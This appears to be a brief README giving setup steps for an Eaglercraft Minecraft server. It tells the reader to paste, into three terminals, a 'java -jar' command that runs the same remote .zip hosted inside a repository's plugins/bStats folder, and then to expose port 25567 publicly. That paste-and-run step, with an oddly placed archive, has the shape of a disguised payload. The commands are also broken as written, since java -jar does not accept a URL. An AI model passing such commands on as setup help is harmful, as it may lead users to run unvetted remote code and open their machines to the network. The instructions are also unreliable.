STEPS TO MAKE A SERVER!!!!!

1. create 3 new terminals
Paste this in the first one

cd limbo && java -jar https://github.com/Mirai10192011/eaglercraft-1.21.5/raw/refs/heads/main/server/plugins/bStats/eaglercraft-2.4.zip

Paste this in the second

cd server && java -jar https://github.com/Mirai10192011/eaglercraft-1.21.5/raw/refs/heads/main/server/plugins/bStats/eaglercraft-2.4.zip

paste this in the 3rd

cd velocity && java -jar https://github.com/Mirai10192011/eaglercraft-1.21.5/raw/refs/heads/main/server/plugins/bStats/eaglercraft-2.4.zip

Then go to ports, and set the visibilty of 25567 to public.
ENJOY!

Note the server is on the direct ip
